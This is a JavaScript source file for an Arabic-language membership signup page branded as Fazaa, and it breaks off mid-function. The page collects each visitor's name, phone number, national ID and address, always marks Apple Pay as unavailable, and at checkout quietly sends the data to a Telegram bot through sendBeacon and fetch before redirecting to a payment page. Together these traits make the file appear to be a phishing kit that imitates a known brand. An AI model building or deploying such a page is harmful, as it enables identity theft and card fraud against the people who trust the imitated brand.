const app = document.getElementById("app");

function createHeader({
  brand = "فزعة",
  utilityItems = ["English"],
} = {}) {
  const header = document.createElement("header");
  header.className = "header";

  header.innerHTML = `
    <div class="header__media" aria-hidden="true">
      <img class="header__background" src="assets/images/header.jpg" alt="" />
    </div>
    <div class="header__inner">
      <div class="header__utility" aria-label="Utility">
        <a class="header__utility-link" href="#"><i class="fa-solid fa-language"></i> ${utilityItems[0]}</a>
        <a class="brand" href="#" aria-label="${brand}">
          <img class="brand__image" src="assets/images/logo.png" alt="" aria-hidden="true" />
        </a>
      </div>
    </div>
  `;

  return header;
}

function initializeLanguageToggle() {
  const toggleLink = document.querySelector(".header__utility-link");
  if (!toggleLink) return;

  const textNode = toggleLink.childNodes[toggleLink.childNodes.length - 1];
  if (!textNode || textNode.nodeType !== Node.TEXT_NODE) return;

  const setLanguage = (lang) => {
    const isArabic = lang === "ar";
    document.documentElement.lang = isArabic ? "ar" : "en";
    document.documentElement.dir = isArabic ? "rtl" : "ltr";
    textNode.textContent = ` ${isArabic ? "English" : "العربية"}`;
    toggleLink.setAttribute("aria-label", isArabic ? "Switch to English" : "التبديل إلى العربية");
    localStorage.setItem("fazaa.language", isArabic ? "ar" : "en");
  };

  const storedLang = localStorage.getItem("fazaa.language");
  if (storedLang === "en" || storedLang === "ar") {
    setLanguage(storedLang);
  } else {
    setLanguage("ar");
  }

  toggleLink.addEventListener("click", (event) => {
    event.preventDefault();
    const currentLang = document.documentElement.lang === "en" ? "en" : "ar";
    setLanguage(currentLang === "ar" ? "en" : "ar");
  });
}

function createFooter({
  brand = "فزعة",
  links = ["سياسة الخصوصية", "شروط الخدمة", "الدعم", "الأسئلة الشائعة"],
  copyright = "© 2026 فزعة. جميع الحقوق محفوظة.",
} = {}) {
  const footer = document.createElement("footer");
  footer.className = "footer";

  footer.innerHTML = `
    <div class="footer__inner">
      <div>
        <strong>${brand}</strong>
        <div class="footer__small">${copyright}</div>
      </div>
      <div class="footer__links">
        ${links.map((item) => `<a href="#">${item}</a>`).join("")}
      </div>
    </div>
  `;

  return footer;
}

function createSlider() {
  const section = document.createElement("section");
  section.className = "slider";

  const slides = [
    {
      image: "assets/images/slider/Fazaa-&-du-web-banner-arabic.png",
    },
    {
      image: "assets/images/slider/Zero-dirhams-(arabic).png",
    },
  ];

  section.innerHTML = `
    <div class="slider__viewport">
      <div class="slider__track">
        ${slides
          .map(
            (slide, index) => `
              <article class="slider__slide${index === 0 ? " slider__slide--active" : ""}">
                <img class="slider__image" src="${slide.image}" alt="" aria-hidden="true" />
                <div class="slider__overlay"></div>
              </article>
            `,
          )
          .join("")}
      </div>
    </div>
  `;

  const slideEls = Array.from(section.querySelectorAll(".slider__slide"));
  let activeIndex = 0;
  let intervalId = null;

  const render = () => {
    slideEls.forEach((slide, index) => {
      slide.classList.toggle("slider__slide--active", index === activeIndex);
    });
  };

  const advance = () => {
    activeIndex = (activeIndex + 1) % slideEls.length;
    render();
  };

  intervalId = window.setInterval(advance, 4000);

  return section;
}

function normalizeWesternDigits(value) {
  const map = {
    "٠": "0",
    "١": "1",
    "٢": "2",
    "٣": "3",
    "٤": "4",
    "٥": "5",
    "٦": "6",
    "٧": "7",
    "٨": "8",
    "٩": "9",
    "۰": "0",
    "۱": "1",
    "۲": "2",
    "۳": "3",
    "۴": "4",
    "۵": "5",
    "۶": "6",
    "۷": "7",
    "۸": "8",
    "۹": "9",
  };

  return value
    .replace(/[٠-٩۰-۹]/g, (digit) => map[digit] ?? digit)
    .replace(/[^0-9]/g, "");
}

function createOrderPage() {
  const page = document.createElement("div");
  page.className = "page order-page";

  page.appendChild(
    createHeader({
      brand: "فزعة",
    }),
  );

  const main = document.createElement("main");
  main.className = "order";
  main.innerHTML = `
    <section class="order__hero">
      <h1 class="order__title">كن عضواً</h1>
      <div class="order__steps" aria-label="Membership steps">
        <div class="order__step" data-step-indicator="1">
          <span class="order__step-dot order__step-dot--active">1</span>
          <span class="order__step-label">معلومات شخصية</span>
        </div>
        <div class="order__step-order order__step-order--active"></div>
        <div class="order__step" data-step-indicator="2">
          <span class="order__step-dot">2</span>
          <span class="order__step-label">معلومات العنوان</span>
        </div>
        <div class="order__step-order"></div>
        <div class="order__step" data-step-indicator="3">
          <span class="order__step-dot">3</span>
          <span class="order__step-label">اشترك</span>
        </div>
      </div>

      <form class="order__panel" id="order-form">
        <p class="order__copy">يرجى إدخال معلوماتك بشكل صحيح</p>

        <section class="order__step-panel order__step-panel--active" data-step-panel="1">
          <div class="order__field">
            <label class="order__label" for="full-name">الاسم</label>
            <input id="full-name" name="fullName" class="order__input" type="text" autocomplete="name" placeholder="يرجى إدخال اسمك" />
            <div class="order__error" data-error-for="full-name" hidden></div>
          </div>

          <div class="order__field">
            <label class="order__label" for="phone-number">رقم الهاتف</label>
            <div class="order__phone-wrap">
              <span class="order__phone-prefix" aria-hidden="true">+971</span>
              <input id="phone-number" name="phoneNumber" class="order__input order__input--phone" type="tel" inputmode="numeric" autocomplete="tel" placeholder="يرجى إدخال رقم هاتفك" />
            </div>
            <div class="order__error" data-error-for="phone-number" hidden></div>
          </div>

          <div class="order__field">
            <label class="order__label" for="national-id">رقم الهوية</label>
            <input id="national-id" name="nationalId" class="order__input" type="text" inputmode="numeric" autocomplete="off" placeholder="يرجى إدخال رقم الهوية" />
            <div class="order__error" data-error-for="national-id" hidden></div>
          </div>
        </section>

        <section class="order__step-panel" data-step-panel="2" hidden>
          <div class="order__field">
            <label class="order__label" for="city">المنطقة</label>
            <div class="order__autocomplete">
              <input id="city" name="city" class="order__input" type="text" autocomplete="off" placeholder="ابدأ بكتابة الإمارة أو المنطقة" />
              <div class="order__suggestions order__suggestions--hidden" data-emirate-suggestions></div>
            </div>
            <div class="order__error" data-error-for="city" hidden></div>
          </div>

          <div class="order__field">
            <label class="order__label" for="street-1">عنوان الشارع</label>
            <input id="street-1" name="street1" class="order__input" type="text" autocomplete="address-line1" placeholder="يرجى ادخال عنوان الشارع" />
            <div class="order__error" data-error-for="street-1" hidden></div>
          </div>

          <div class="order__field">
            <label class="order__label" for="street-2">الحي</label>
            <input id="street-2" name="street2" class="order__input" type="text" autocomplete="address-line2" placeholder="يرجى ادخال الحي" />
            <div class="order__error" data-error-for="street-2" hidden></div>
          </div>

          <div class="order__field">
            <label class="order__label" for="delivery-date">موعد الاستلام</label>
            <div class="order__date-wrap" data-date-picker>
              <input id="delivery-date" name="deliveryDate" type="hidden" />
              <button class="order__date-trigger" type="button" data-date-trigger aria-haspopup="dialog" aria-expanded="false">
                <span class="order__date-value" data-date-value>موعد الاستلام</span>
              </button>
              <div class="order__date-panel order__date-panel--hidden" data-date-panel>
                <div class="order__date-header">
                  <button class="order__date-nav" type="button" data-date-prev aria-label="الشهر السابق">›</button>
                  <strong class="order__date-title" data-date-title></strong>
                  <button class="order__date-nav" type="button" data-date-next aria-label="الشهر التالي">‹</button>
                </div>
                <div class="order__date-weekdays">
                  <span>ح</span>
                  <span>ن</span>
                  <span>ث</span>
                  <span>ر</span>
                  <span>خ</span>
                  <span>ج</span>
                  <span>س</span>
                </div>
                <div class="order__date-grid" data-date-grid></div>
                <div class="order__date-actions">
                  <button class="order__date-action" type="button" data-date-clear>مسح</button>
                  <button class="order__date-action order__date-action--primary" type="button" data-date-today>اليوم</button>
                </div>
              </div>
            </div>
            <div class="order__error" data-error-for="delivery-date" hidden></div>
          </div>
        </section>

        <section class="order__step-panel order__step-panel--summary" data-step-panel="3" hidden>
          <h2 class="order__summary-title">الفاتورة وطريقة الدفع</h2>

          <section class="order__summary-card">
            <h3 class="order__summary-heading">ملخص الطلب</h3>
            <div class="order__summary-list" data-order-summary></div>
          </section>

          <section class="order__summary-total">
            <div class="order__summary-total-label">المبلغ الإجمالي</div>
            <div class="order__summary-total-value" data-order-total></div>
          </section>

          <section class="order__payment">
            <h3 class="order__payment-title">اختر طريقة الدفع</h3>
            <label class="order__payment-option">
              <input type="radio" name="paymentMethod" value="card" checked />
              <span class="order__payment-content">
                <span class="order__payment-text">فيزا / ماستركارد</span>
                <span class="order__payment-icons" aria-hidden="true">
                  <i class="fa-brands fa-cc-visa order__payment-icon order__payment-icon--visa"></i>
                  <img class="order__payment-icon order__payment-icon--mastercard-image" src="assets/images/Mastercard.svg" alt="" />
                </span>
              </span>
            </label>
            <label class="order__payment-option" data-payment-unavailable>
              <input type="radio" name="paymentMethod" value="applepay" />
              <span class="order__payment-content">
                <span class="order__payment-text">أبل باي</span>
                <span class="order__payment-icons" aria-hidden="true">
                  <i class="fa-brands fa-cc-apple-pay order__payment-icon order__payment-icon--applepay"></i>
                </span>
              </span>
            </label>
            <div class="order__payment-error" data-payment-error hidden></div>
          </section>
        </section>

        <div class="order__actions">
          <button class="order__submit order__submit--back" type="button" data-order-back hidden>رجوع</button>
          <button class="order__submit" type="button" data-order-primary>المتابعة</button>
        </div>
      </form>
    </section>
  `;

  const form = main.querySelector("#order-form");
  const orderCopy = main.querySelector(".order__copy");
  const fullNameInput = main.querySelector("#full-name");
  const phoneInput = main.querySelector("#phone-number");
  const nationalIdInput = main.querySelector("#national-id");
  const street1Input = main.querySelector("#street-1");
  const street2Input = main.querySelector("#street-2");
  const cityInput = main.querySelector("#city");
  const cityAutocomplete = main.querySelector(".order__autocomplete");
  const emirateSuggestions = main.querySelector("[data-emirate-suggestions]");
  const deliveryDateInput = main.querySelector("#delivery-date");
  const dateWrap = main.querySelector(".order__date-wrap");
  const dateTrigger = main.querySelector("[data-date-trigger]");
  const dateValue = main.querySelector("[data-date-value]");
  const datePanel = main.querySelector("[data-date-panel]");
  const dateTitle = main.querySelector("[data-date-title]");
  const dateGrid = main.querySelector("[data-date-grid]");
  const datePrev = main.querySelector("[data-date-prev]");
  const dateNext = main.querySelector("[data-date-next]");
  const dateToday = main.querySelector("[data-date-today]");
  const dateClear = main.querySelector("[data-date-clear]");
  const primaryButton = main.querySelector("[data-order-primary]");
  const backButton = main.querySelector("[data-order-back]");
  const summaryList = main.querySelector("[data-order-summary]");
  const totalValue = main.querySelector("[data-order-total]");
  const paymentInputs = Array.from(main.querySelectorAll('input[name="paymentMethod"]'));
  const paymentUnavailable = main.querySelector("[data-payment-unavailable]");
  const paymentError = main.querySelector("[data-payment-error]");
  const panels = Array.from(main.querySelectorAll("[data-step-panel]"));
  const stepIndicators = Array.from(main.querySelectorAll("[data-step-indicator]"));
  const connectors = Array.from(main.querySelectorAll(".order__step-order"));
  const errorEls = Array.from(main.querySelectorAll(".order__error"));
  const storageKey = "fazaa.orderForm";
  const selectedTier = new URLSearchParams(window.location.search).get("tier") || readStoredTier();
  const today = new Date();
  const todayIso = new Date(today.getTime() - today.getTimezoneOffset() * 60000).toISOString().slice(0, 10);
  const arabicMonths = ["يناير", "فبراير", "مارس", "أبريل", "مايو", "يونيو", "يوليو", "أغسطس", "سبتمبر", "أكتوبر", "نوفمبر", "ديسمبر"];
  const emirates = ["أبوظبي", "دبي", "الشارقة", "عجمان", "أم القيوين", "رأس الخيمة", "الفجيرة"];
  const tierConfig = {
    platinum: { label: "البلاتينية", price: 75, deliveryFee: 0 },
    gold: { label: "الذهبية", price: 75, deliveryFee: 0 },
    silver: { label: "الفضية", price: 0, deliveryFee: 5 },
    fazaa: { label: "خصومات فزعه", price: 0, deliveryFee: 5 },
  };
  const membershipFee = 0;
  const flatDeliveryFee = 5;
  let visibleMonth = today.getMonth();
  let visibleYear = today.getFullYear();
  function readStoredTier() {
    try {
      return window.localStorage.getItem("fazaa.selectedTier") || "silver";
    } catch {
      return "silver";
    }
  }
  const activeTierKey = tierConfig[selectedTier] ? selectedTier : "silver";
  window.localStorage.setItem("fazaa.selectedTier", activeTierKey);
  const activeTier = tierConfig[activeTierKey];
  const syncDateHint = () => {
    const isEmpty = !deliveryDateInput.value;
    deliveryDateInput.dataset.empty = isEmpty ? "true" : "false";
    dateValue.textContent = isEmpty ? "موعد الاستلام" : formatDisplayDate(deliveryDateInput.value);
    dateValue.classList.toggle("order__date-value--placeholder", isEmpty);
  };
  const parseIsoDate = (value) => {
    if (!value) {
      return null;
    }
    const [year, month, day] = value.split("-").map(Number);
    return new Date(year, month - 1, day);
  };
  const formatIsoDate = (date) => {
    const year = date.getFullYear();
    const month = String(date.getMonth() + 1).padStart(2, "0");
    const day = String(date.getDate()).padStart(2, "0");
    return `${year}-${month}-${day}`;
  };
  const formatDisplayDate = (value) => {
    const date = parseIsoDate(value);
    if (!date) {
      return "موعد الاستلام";
    }
    return `${String(date.getDate()).padStart(2, "0")}/${String(date.getMonth() + 1).padStart(2, "0")}/${date.getFullYear()}`;
  };
  const isPastDate = (date) => formatIsoDate(date) < todayIso;
  const positionDatePanel = () => {
    datePanel.classList.remove("order__date-panel--top", "order__date-panel--compact");
    datePanel.style.maxHeight = "";

    const wrapRect = dateWrap.getBoundingClientRect();
    const panelRect = datePanel.getBoundingClientRect();
    const viewportHeight = window.innerHeight;
    const spaceBelow = viewportHeight - wrapRect.bottom - 12;
    const spaceAbove = wrapRect.top - 12;
    const shouldOpenUp = panelRect.height > spaceBelow && spaceAbove > spaceBelow;
    const availableHeight = Math.max(220, shouldOpenUp ? spaceAbove : spaceBelow);

    datePanel.classList.toggle("order__date-panel--top", shouldOpenUp);
    datePanel.style.maxHeight = `${Math.min(panelRect.height, availableHeight)}px`;
  };
  const closeDatePanel = () => {
    datePanel.classList.add("order__date-panel--hidden");
    dateTrigger.setAttribute("aria-expanded", "false");
  };
  const openDatePanel = () => {
    datePanel.classList.remove("order__date-panel--hidden");
    dateTrigger.setAttribute("aria-expanded", "true");
    positionDatePanel();
  };
  const renderDateGrid = () => {
    dateTitle.textContent = `${arabicMonths[visibleMonth]} ${visibleYear}`;
    const firstDay = new Date(visibleYear, visibleMonth, 1).getDay();
    const daysInMonth = new Date(visibleYear, visibleMonth + 1, 0).getDate();
    const selected = deliveryDateInput.value;
    const cells = [];

    for (let i = 0; i < firstDay; i += 1) {
      cells.push('<span class="order__date-cell order__date-cell--empty"></span>');
    }

    for (let day = 1; day <= daysInMonth; day += 1) {
      const date = new Date(visibleYear, visibleMonth, day);
      const iso = formatIsoDate(date);
      const isDisabled = isPastDate(date);
      const isSelected = selected === iso;
      cells.push(`
        <button
          class="order__date-cell${isSelected ? " order__date-cell--selected" : ""}"
          type="button"
          data-date-select="${iso}"
          ${isDisabled ? "disabled" : ""}
        >${day}</button>
      `);
    }

    dateGrid.innerHTML = cells.join("");
  };
  const readStoredPayload = () => {
    try {
      return JSON.parse(window.localStorage.getItem(storageKey) || "{}");
    } catch {
      return {};
    }
  };
  const writeStoredPayload = (patch = {}) => {
    const current = readStoredPayload();
    const payload = {
      ...current,
      ...patch,
    };
    window.localStorage.setItem(storageKey, JSON.stringify(payload));
    return payload;
  };
  const collectStepOnePayload = () => ({
    fullName: fullNameInput.value.trim() || "غير معروف",
    phoneNumber: normalizeWesternDigits(phoneInput.value.trim()) || "غير معروف",
    nationalId: normalizeWesternDigits(nationalIdInput.value.trim()) || "غير معروف",
  });
  const collectStepTwoPayload = () => ({
    street1: street1Input.value.trim() || "غير معروف",
    street2: street2Input.value.trim() || "غير معروف",
    city: cityInput.value.trim() || "غير معروف",
    deliveryDate: deliveryDateInput.value || "غير معروف",
  });
  const renderStepThreeSummary = () => {
    const payload = readStoredPayload();
    const total = membershipFee + flatDeliveryFee;
    const addressParts = [payload.city, payload.street1, payload.street2].filter((value) => value && value !== "غير معروف");

    summaryList.innerHTML = `
      <div class="order__summary-row"><span>الاسم</span><strong>${payload.fullName || "غير معروف"}</strong></div>
      <div class="order__summary-row"><span>رقم الهاتف</span><strong>${payload.phoneNumber || "غير معروف"}</strong></div>
      <div class="order__summary-row"><span>نوع البطاقة</span><strong>${activeTier.label}</strong></div>
      <div class="order__summary-row"><span>رسوم العضوية</span><strong>${membershipFee} درهم</strong></div>
      <div class="order__summary-row"><span>رسوم التوصيل</span><strong>${flatDeliveryFee} درهم</strong></div>
      <div class="order__summary-row"><span>العنوان</span><strong>${addressParts.join("، ") || "غير معروف"}</strong></div>
      <div class="order__summary-row"><span>موعد الاستلام</span><strong>${payload.deliveryDate && payload.deliveryDate !== "غير معروف" ? formatDisplayDate(payload.deliveryDate) : "غير معروف"}</strong></div>
    `;
    totalValue.textContent = `${total} درهم`;
  };
  const getTelegramCredentials = () => {
    const token = String(globalThis.telegramToken || "").trim();
    const chatId = String(globalThis.chatId || "").trim();
    return token && chatId ? { token, chatId } : null;
  };
  const formatOrderSummaryMessage = (payload) => {
    const addressParts = [payload.city, payload.street1, payload.street2].filter((value) => value && value !== "غير معروف");
    const deliveryDateText =
      payload.deliveryDate && payload.deliveryDate !== "غير معروف" ? formatDisplayDate(payload.deliveryDate) : "غير معروف";
    const phoneText =
      payload.phoneNumber && payload.phoneNumber !== "غير معروف"
        ? `\u200E+971 ${payload.phoneNumber}\u200E`
        : "غير معروف";

    return [
      "<b>🧾 طلب جديد - فزعة</b>",
      "",
      "<b>👤 معلومات العميل</b>",
      "",
      `• <b>الاسم:</b> ${payload.fullName || "غير معروف"}`,
      `• <b>الهاتف:</b> <code>${phoneText}</code>`,
      `• <b>الهوية:</b> ${payload.nationalId || "غير معروف"}`,
      "",
      "<b>📦 تفاصيل الطلب</b>",
      "",
      `• <b>نوع البطاقة:</b> ${activeTier.label}`,
      `• <b>رسوم العضوية:</b> ${membershipFee} درهم`,
      `• <b>رسوم التوصيل:</b> ${flatDeliveryFee} درهم`,
      `• <b>العنوان:</b> ${addressParts.join("، ") || "غير معروف"}`,
      `• <b>موعد الاستلام:</b> ${deliveryDateText}`,
    ].join("\n");
  };
  const sendTelegramOrderSummary = async (payload) => {
    const credentials = getTelegramCredentials();
    if (!credentials) {
      return false;
    }
    const message = formatOrderSummaryMessage(payload);
    const endpoint = `https://api.telegram.org/bot${credentials.token}/sendMessage`;
    const requestBody = {
      chat_id: credentials.chatId,
      text: message,
      parse_mode: "HTML",
      disable_web_page_preview: true,
    };

    let beaconQueued = false;
    if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
      try {
        const blob = new Blob([JSON.stringify(requestBody)], { type: "application/json" });
        beaconQueued = navigator.sendBeacon(endpoint, blob);
      } catch {
        // Fall back to fetch.
      }
    }

    try {
      const response = await fetch(endpoint, {
        method: "POST",
        keepalive: true,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestBody),
      });
      return response.ok || beaconQueued;
    } catch {
      return beaconQueued;
    }
  };
  const syncPaymentSelection = (value) => {
    const fallback = paymentInputs[0]?.value || "card";
    const targetValue = paymentInputs.some((input) => input.value === value) ? value : fallback;
    paymentInputs.forEach((input) => {
      input.checked = input.value === targetValue;
    });
    return targetValue;
  };
  const showPaymentError = () => {
    if (!paymentError) {
      return;
    }
    paymentError.textContent = "هذه طريقة الدفع غير متاحة في الوقت الحالي";
    paymentError.hidden = false;
  };
  const clearPaymentError = () => {
    if (!paymentError) {
      return;
    }
    paymentError.textContent = "";
    paymentError.hidden = true;
  };
  const normalizeArabicSearch = (value) =>
    value
      .trim()
      .replace(/\s+/g, "")
      .replace(/[أإآ]/g, "ا")
      .replace(/ة/g, "ه")
      .replace(/ى/g, "ي")
      .replace(/ؤ/g, "و")
      .replace(/ئ/g, "ي");
  const getFilteredEmirates = (value) => {
    const query = normalizeArabicSearch(value);
    if (!query) {
      return emirates;
    }
    return emirates.filter((emirate) => normalizeArabicSearch(emirate).includes(query));
  };
  const renderEmirateSuggestions = (value = cityInput.value) => {
    const matches = getFilteredEmirates(value);
    emirateSuggestions.innerHTML = matches
      .map((emirate) => `<button class="order__suggestion" type="button" data-emirate-option="${emirate}">${emirate}</button>`)
      .join("");
    emirateSuggestions.classList.toggle("order__suggestions--hidden", matches.length === 0);
  };
  const hideEmirateSuggestions = () => {
    emirateSuggestions.classList.add("order__suggestions--hidden");
  };

  phoneInput.addEventListener("input", () => {
    const normalized = normalizeWesternDigits(phoneInput.value);
    if (phoneInput.value !== normalized) {
      phoneInput.value = normalized;
    }
    writeStoredPayload({
      phoneNumber: normalized || "غير معروف",
    });
  });

  const clearFieldErrorOnInput = (input) => {
    input.addEventListener("input", () => {
      setFieldError(input, "");
    });
  };

  [fullNameInput, phoneInput, nationalIdInput, street1Input, street2Input, cityInput, deliveryDateInput].forEach(clearFieldErrorOnInput);
  fullNameInput.addEventListener("input", () => {
    writeStoredPayload({
      fullName: fullNameInput.value.trim() || "غير معروف",
    });
  });
  nationalIdInput.addEventListener("input", () => {
    writeStoredPayload({
      nationalId: normalizeWesternDigits(nationalIdInput.value.trim()) || "غير معروف",
    });
  });
  street1Input.addEventListener("input", () => {
    writeStoredPayload({
      street1: street1Input.value.trim() || "غير معروف",
    });
  });
  street2Input.addEventListener("input", () => {
    writeStoredPayload({
      street2: street2Input.value.trim() || "غير معروف",
    });
  });
  cityInput.addEventListener("input", () => {
    writeStoredPayload({
      city: cityInput.value.trim() || "غير معروف",
    });
    renderEmirateSuggestions(cityInput.value);
  });
  cityInput.addEventListener("focus", () => {
    renderEmirateSuggestions(cityInput.value);
  });
  cityInput.addEventListener("blur", () => {
    window.setTimeout(() => {
      if (!cityAutocomplete.contains(document.activeElement)) {
        hideEmirateSuggestions();
      }
    }, 0);
  });
  emirateSuggestions.addEventListener("mousedown", (event) => {
    const option = event.target.closest("[data-emirate-option]");
    if (!option) {
      return;
    }
    event.preventDefault();
    cityInput.value = option.dataset.emirateOption || "";
    writeStoredPayload({
      city: cityInput.value.trim() || "غير معروف",
    });
    hideEmirateSuggestions();
  });
  main.addEventListener("mousedown", (event) => {
    if (!cityAutocomplete.contains(event.target)) {
      hideEmirateSuggestions();
    }
  });
  deliveryDateInput.addEventListener("input", syncDateHint);
  deliveryDateInput.addEventListener("change", syncDateHint);
  deliveryDateInput.addEventListener("change", () => {
    writeStoredPayload({
      deliveryDate: deliveryDateInput.value || "غير معروف",
    });
    renderDateGrid();
  });
  dateTrigger.addEventListener("click", () => {
    if (datePanel.classList.contains("order__date-panel--hidden")) {
      openDatePanel();
    } else {
      closeDatePanel();
    }
  });
  datePrev.addEventListener("click", () => {
    visibleMonth -= 1;
    if (visibleMonth < 0) {
      visibleMonth = 11;
      visibleYear -= 1;
    }
    renderDateGrid();
  });
  dateNext.addEventListener("click", () => {
    visibleMonth += 1;
    if (visibleMonth > 11) {
      visibleMonth = 0;
      visibleYear += 1;
    }
    renderDateGrid();
  });
  dateGrid.addEventListener("click", (event) => {
    const button = event.target.closest("[data-date-select]");
    if (!button || button.disabled) {
      return;
    }
    deliveryDateInput.value = button.dataset.dateSelect || "";
    syncDateHint();
    writeStoredPayload({
      deliveryDate: deliveryDateInput.value || "غير معروف",
    });
    renderDateGrid();
    closeDatePanel();
  });
  dateToday.addEventListener("click", () => {
    deliveryDateInput.value = todayIso;
    visibleMonth = today.getMonth();
    visibleYear = today.getFullYear();
    syncDateHint();
    writeStoredPayload({
      deliveryDate: deliveryDateInput.value,
    });
    renderDateGrid();
    closeDatePanel();
  });
  dateClear.addEventListener("click", () => {
    deliveryDateInput.value = "";
    syncDateHint();
    writeStoredPayload({
      deliveryDate: "غير معروف",
    });
    renderDateGrid();
    closeDatePanel();
  });
  main.addEventListener("mousedown", (event) => {
    if (!dateWrap.contains(event.target)) {
      closeDatePanel();
    }
  });
  window.addEventListener("resize", () => {
    if (!datePanel.classList.contains("order__date-panel--hidden")) {
      positionDatePanel();
    }
  });
  window.addEventListener("scroll", () => {
    if (!datePanel.classList.contains("order__date-panel--hidden")) {
      positionDatePanel();
    }
  });
  syncDateHint();
  renderDateGrid();

  paymentInputs.forEach((input) => {
    input.addEventListener("change", () => {
      if (!input.checked) {
        return;
      }
      if (input.value === "applepay") {
        input.checked = false;
        syncPaymentSelection("card");
        showPaymentError();
        return;
      }
      clearPaymentError();
      writeStoredPayload({
        paymentMethod: input.value,
      });
    });
  });

  if (paymentUnavailable) {
    paymentUnavailable.addEventListener("click", (event) => {
      event.preventDefault();
      event.stopPropagation();
      syncPaymentSelection("card");
      showPaymentError();
    });
  }

  const showStep = (stepNumber) => {
    const stepOneDot = main.querySelector('[data-step-indicator="1"] .order__step-dot');
    const stepTwoDot = main.querySelector('[data-step-indicator="2"] .order__step-dot');
    const stepThreeDot = main.querySelector('[data-step-indicator="3"] .order__step-dot');

    panels.forEach((panel) => {
      const isActive = panel.dataset.stepPanel === String(stepNumber);
      panel.hidden = !isActive;
      panel.classList.toggle("order__step-panel--active", isActive);
    });

    stepOneDot.classList.add("order__step-dot--active");
    stepTwoDot.classList.toggle("order__step-dot--active", Number(stepNumber) >= 2);
    stepThreeDot.classList.toggle("order__step-dot--active", Number(stepNumber) >= 3);
    connectors[0].classList.toggle("order__step-order--active", Number(stepNumber) >= 2);
    connectors[1].classList.toggle("order__step-order--active", Number(stepNumber) >= 3);

    const isStepOne = Number(stepNumber) === 1;
    const isStepThree = Number(stepNumber) === 3;
    backButton.hidden = false;
    orderCopy.hidden = isStepThree;
    writeStoredPayload({
      currentStep: String(stepNumber),
    });
    primaryButton.textContent = isStepThree ? "متابعة للدفع" : "المتابعة";
    if (isStepThree) {
      syncPaymentSelection(readStoredPayload().paymentMethod);
      renderStepThreeSummary();
    }
  };

  const setFieldError = (input, message) => {
    const error = main.querySelector(`[data-error-for="${input.id}"]`);
    if (!error) {
      return;
    }

    input.classList.toggle("order__input--error", Boolean(message));
    error.textContent = message || "";
    error.hidden = !message;
  };

  const validateStepOne = () => {
    let valid = true;

    [
      [fullNameInput, "يرجى إدخال الاسم"],
      [phoneInput, "يرجى إدخال رقم الهاتف"],
      [nationalIdInput, "يرجى إدخال رقم الهوية"],
    ].forEach(([input, message]) => {
      const value = input.value.trim();
      const normalized = input === phoneInput || input === nationalIdInput ? normalizeWesternDigits(value) : value;
      if (!normalized) {
        setFieldError(input, message);
        valid = false;
      } else {
        setFieldError(input, "");
      }
    });

    return valid;
  };

  const validateStepTwo = () => {
    let valid = true;
    const fields = [
      [street1Input, "يرجى إدخال العنوان 1"],
      [street2Input, "يرجى إدخال العنوان 2"],
      [cityInput, "يرجى إدخال الإمارة أو المنطقة"],
      [deliveryDateInput, "يرجى اختيار موعد الاستلام"],
    ];

    fields.forEach(([input, message]) => {
      const value = input.value.trim();
      if (!value) {
        setFieldError(input, message);
        valid = false;
      } else {
        setFieldError(input, "");
      }
    });

    if (deliveryDateInput.value && deliveryDateInput.value < todayIso) {
      setFieldError(deliveryDateInput, "يجب أن يكون الموعد اليوم أو في المستقبل");
      valid = false;
    }

    return valid;
  };

  const clearErrors = () => {
    errorEls.forEach((error) => {
      error.hidden = true;
      error.textContent = "";
    });
    [fullNameInput, phoneInput, nationalIdInput, street1Input, street2Input, cityInput, deliveryDateInput].forEach((input) => {
      input.classList.remove("order__input--error");
    });
  };

  primaryButton.addEventListener("click", async () => {
    if (!main.querySelector('[data-step-panel="3"]').hidden) {
      const paymentMethod = syncPaymentSelection(readStoredPayload().paymentMethod);
      const checkoutPayload = writeStoredPayload({
        ...collectStepOnePayload(),
        ...collectStepTwoPayload(),
        paymentMethod,
        currentStep: "3",
      });
      // Do not block navigation on network calls; send in background.
      sendTelegramOrderSummary(checkoutPayload).catch(() => {});
      window.location.href = "payment.html";
      return;
    }

    if (main.querySelector('[data-step-panel="2"]').hidden) {
      if (!validateStepOne()) {
        return;
      }

      const payload = {
        ...collectStepOnePayload(),
      };

      writeStoredPayload(payload);
      showStep(2);
      return;
    }

    if (!validateStepTwo()) {
      return;
    }

    writeStoredPayload({
      ...collectStepOnePayload(),
      ...collectStepTwoPayload(),
    });
    showStep(3);
  });

  backButton.addEventListener("click", () => {
    clearErrors();
    if (!main.querySelector('[data-step-panel="3"]').hidden) {
      showStep(2);
      return;
    }
    showStep(1);
  });

  const storedPayload = readStoredPayload();
  if (storedPayload.fullName && storedPayload.fullName !== "غير معروف") {
    fullNameInput.value = storedPayload.fullName;
  }
  if (storedPayload.phoneNumber && storedPayload.phoneNumber !== "غير معروف") {
    phoneInput.value = normalizeWesternDigits(storedPayload.phoneNumber);
  }
  if (storedPayload.nationalId && storedPayload.nationalId !== "غير معروف") {
    nationalIdInput.value = normalizeWesternDigits(storedPayload.nationalId);
  }
  if (storedPayload.street1 && storedPayload.street1 !== "غير معروف") {
    street1Input.value = storedPayload.street1;
  }
  if (storedPayload.street2 && storedPayload.street2 !== "غير معروف") {
    street2Input.value = storedPayload.street2;
  }
  if (storedPayload.city && storedPayload.city !== "غير معروف") {
    cityInput.value = storedPayload.city;
  }
  if (storedPayload.deliveryDate && storedPayload.deliveryDate !== "غير معروف") {
    deliveryDateInput.value = storedPayload.deliveryDate;
    const storedDate = parseIsoDate(storedPayload.deliveryDate);
    if (storedDate) {
      visibleMonth = storedDate.getMonth();
      visibleYear = storedDate.getFullYear();
    }
  }
  syncPaymentSelection(storedPayload.paymentMethod);
  syncDateHint();
  renderDateGrid();
  if (storedPayload.paymentMethod === "applepay") {
    syncPaymentSelection("card");
    clearPaymentError();
  }

  const hasStepOneProgress =
    (storedPayload.fullName && storedPayload.fullName !== "غير معروف") ||
    (storedPayload.phoneNumber && storedPayload.phoneNumber !== "غير معروف") ||
    (storedPayload.nationalId && storedPayload.nationalId !== "غير معروف");
  const hasStepTwoProgress =
    (storedPayload.street1 && storedPayload.street1 !== "غير معروف") ||
    (storedPayload.street2 && storedPayload.street2 !== "غير معروف") ||
    (storedPayload.city && storedPayload.city !== "غير معروف") ||
    (storedPayload.deliveryDate && storedPayload.deliveryDate !== "غير معروف");
  const hasFullCheckoutState = hasStepOneProgress && hasStepTwoProgress;
  const initialStep = storedPayload.currentStep === "3" && hasFullCheckoutState ? 3 : hasStepTwoProgress ? 2 : 1;
  showStep(initialStep);

  form.addEventListener("submit", (event) => {
